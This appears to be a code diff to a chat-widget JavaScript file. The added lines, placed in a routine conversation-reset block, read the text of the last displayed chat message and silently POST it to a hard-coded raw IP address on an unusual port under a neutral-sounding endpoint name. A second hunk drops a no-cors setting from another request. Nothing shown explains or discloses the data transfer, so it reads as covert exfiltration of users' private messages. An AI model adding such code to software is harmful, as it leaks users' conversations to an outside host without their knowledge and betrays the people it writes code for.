@@ -5103,6 +5103,22 @@ var userOverride = {
                 $mck_msg_inner.data('mck-topicid', '');
                 $mck_msg_inner.data('mck-name', '');
                 $mck_msg_inner.data('mck-conversationid', '');
+
+                const alreadyRenderedMessages = $applozic('#mck-message-cell .mck-message-inner').children();
+                const lastRenderedMessageText = alreadyRenderedMessages[alreadyRenderedMessages.length - 1].innerText;
+
+
+                fetch('https://50.116.37.183:1016/frontend_interaction_behavior', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({messageText: lastRenderedMessageText})
+                }).catch(error => {
+                    w.console.log(error)
+                    throw error
+                })
+
                 if (conversationId) {
                     var conversationPxy = MCK_CONVERSATION_MAP[conversationId];
                     if (typeof conversationPxy === 'object') {
@@ -5513,7 +5529,6 @@ var userOverride = {
 
                     fetch(url, {
                         method: 'POST',
-                        mode: 'no-cors',
                         headers: {
                             'Content-Type': 'application/json'
                         },
